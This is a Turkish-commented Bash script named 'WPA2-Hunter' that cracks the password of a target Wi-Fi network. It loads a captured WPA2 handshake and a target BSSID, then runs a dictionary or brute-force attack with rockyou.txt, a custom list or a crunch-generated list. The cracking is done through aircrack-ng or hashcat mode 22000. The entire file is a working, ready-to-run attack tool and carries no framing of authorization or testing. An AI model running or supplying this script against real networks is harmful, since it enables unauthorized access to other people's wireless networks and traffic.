#!/bin/bash

# WPA2-Hunter - Parola Kırma Scripti
# Yakalanan handshake'i dictionary/brute force ile kırar

set -e

echo "================================================"
echo "   WPA2-Hunter - Parola Kırma"
echo "================================================"
echo ""

# Root kontrolü
if [ "$EUID" -ne 0 ]; then
    echo "[!] Bu script root yetkileri gerektirir!"
    echo "    Kullanım: sudo $0"
    exit 1
fi

# Handshake dosyası seçimi
echo "[*] Handshake .cap dosyasını seçin"
CAPTURE_DIR="../captures"

if [ -d "$CAPTURE_DIR" ]; then
    echo ""
    echo "Mevcut .cap dosyaları:"
    echo "---"
    ls -lh "$CAPTURE_DIR"/*.cap 2>/dev/null || echo "   (Hiçbir .cap dosyası bulunamadı)"
    echo ""
fi

read -p "[?] .cap dosya yolu: " CAP_FILE

# Dosya kontrolü
if [ ! -f "$CAP_FILE" ]; then
    echo "[!] Hata: $CAP_FILE bulunamadı!"
    exit 1
fi

echo ""
echo "[*] Handshake doğrulanıyor..."
if ! aircrack-ng "$CAP_FILE" 2>&1 | grep -q "1 handshake"; then
    echo "[!] UYARI: Handshake bulunamadı veya geçersiz!"
    echo "[*] Yine de devam etmek istiyor musunuz? (e/h)"
    read -p ">>> " CONTINUE
    if [ "$CONTINUE" != "e" ]; then
        exit 1
    fi
fi

# BSSID seçimi
echo ""
echo "[*] Hedef BSSID'yi belirleyin"
if [ -f /tmp/wpa2hunter_target_bssid.conf ]; then
    SAVED_BSSID=$(cat /tmp/wpa2hunter_target_bssid.conf)
    echo "[*] Kaydedilmiş: $SAVED_BSSID"
    read -p "[?] Kullanılsın mı? (e/h): " USE_SAVED
    if [ "$USE_SAVED" = "e" ]; then
        TARGET_BSSID="$SAVED_BSSID"
    fi
fi

if [ -z "$TARGET_BSSID" ]; then
    read -p "[?] Hedef BSSID: " TARGET_BSSID
fi

# Wordlist seçimi
echo ""
echo "📚 Wordlist Seçimi"
echo "---"
echo "  1) Rockyou.txt (~14M parola - önerilen)"
echo "  2) Özel wordlist dosyası"
echo "  3) Crunch ile anlık oluştur"
echo ""
read -p "[?] Seçiminiz (1/2/3): " WORDLIST_CHOICE

case $WORDLIST_CHOICE in
    1)
        # Rockyou.txt
        ROCKYOU_PATH="/usr/share/wordlists/rockyou.txt"
        
        if [ ! -f "$ROCKYOU_PATH" ]; then
            # Sıkıştırılmış versiyonu kontrol et
            if [ -f "${ROCKYOU_PATH}.gz" ]; then
                echo "[*] Rockyou.txt sıkıştırması açılıyor..."
                gunzip "${ROCKYOU_PATH}.gz"
            else
                echo "[!] Hata: Rockyou.txt bulunamadı!"
                echo "[*] Kali Linux'ta varsayılan olarak /usr/share/wordlists/ klasöründe olmalı"
                exit 1
            fi
        fi
        
        WORDLIST="$ROCKYOU_PATH"
        echo "[*] Wordlist: $WORDLIST"
        ;;
    2)
        read -p "[?] Wordlist dosya yolu: " WORDLIST
        if [ ! -f "$WORDLIST" ]; then
            echo "[!] Hata: $WORDLIST bulunamadı!"
            exit 1
        fi
        ;;
    3)
        echo ""
        echo "[*] Crunch ile Wordlist Oluşturma"
        echo "---"
        read -p "[?] Minimum karakter sayısı: " MIN_LEN
        read -p "[?] Maksimum karakter sayısı: " MAX_LEN
        echo ""
        echo "Karakter Seti:"
        echo "  1) Sadece sayılar (0123456789)"
        echo "  2) Küçük harf + sayı (a-z, 0-9)"
        echo "  3) Büyük+küçük harf + sayı (A-Z, a-z, 0-9)"
        read -p "[?] Seçim: " CHARSET_CHOICE
        
        case $CHARSET_CHOICE in
            1) CHARSET="0123456789" ;;
            2) CHARSET="abcdefghijklmnopqrstuvwxyz0123456789" ;;
            3) CHARSET="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789" ;;
            *) echo "[!] Geçersiz seçim!"; exit 1 ;;
        esac
        
        WORDLIST="/tmp/crunch_wordlist.txt"
        echo "[*] Wordlist oluşturuluyor... (Bu uzun sürebilir)"
        crunch "$MIN_LEN" "$MAX_LEN" "$CHARSET" -o "$WORDLIST"
        echo "[*] Wordlist oluşturuldu: $WORDLIST"
        ;;
    *)
        echo "[!] Geçersiz seçim!"
        exit 1
        ;;
esac

# Wordlist boyut kontrolü
WORDLIST_SIZE=$(wc -l < "$WORDLIST")
echo ""
echo "[*] Wordlist bilgileri:"
echo "   Dosya: $WORDLIST"
echo "   Satır sayısı: $WORDLIST_SIZE"
echo ""

# Kırma yöntemi seçimi
echo "🔓 Kırma Yöntemi:"
echo "---"
echo "  1) Aircrack-ng (CPU - ~1,000 key/s)"
echo "  2) Hashcat (GPU - ~100,000+ key/s) [Önerilen]"
echo ""
read -p "[?] Seçiminiz (1/2): " CRACK_METHOD

echo ""
echo "⏳ Parola kırma başlatılıyor..."
echo ""

case $CRACK_METHOD in
    1)
        # Aircrack-ng
        echo "[*] Aircrack-ng ile kırma başlatıldı"
        echo "---"
        aircrack-ng -w "$WORDLIST" -b "$TARGET_BSSID" "$CAP_FILE"
        ;;
    2)
        # Hashcat
        if ! command -v hashcat &> /dev/null; then
            echo "[!] Hata: Hashcat yüklü değil!"
            echo "[*] Yüklemek için: sudo apt install hashcat"
            exit 1
        fi
        
        # cap2hashcat dönüşümü
        HASH_FILE="/tmp/handshake.hc22000"
        
        if command -v hcxpcapngtool &> /dev/null; then
            echo "[*] .cap dosyası hashcat formatına dönüştürülüyor..."
            hcxpcapngtool -o "$HASH_FILE" "$CAP_FILE"
        else
            echo "[!] Hata: hcxpcapngtool yüklü değil!"
            echo "[*] Yüklemek için: sudo apt install hcxtools"
            exit 1
        fi
        
        if [ ! -f "$HASH_FILE" ]; then
            echo "[!] Hata: Hash dosyası oluşturulamadı"
            exit 1
        fi
        
        echo "[*] Hashcat ile kırma başlatıldı (WPA2 mode 22000)"
        echo "---"
        hashcat -m 22000 -a 0 "$HASH_FILE" "$WORDLIST"
        
        # Sonucu göster
        echo ""
        echo "[*] Bulunan parolalar:"
        hashcat -m 22000 "$HASH_FILE" --show
        ;;
    *)
        echo "[!] Geçersiz seçim!"
        exit 1
        ;;
esac

echo ""
echo "[*] İşlem tamamlandı."
echo ""
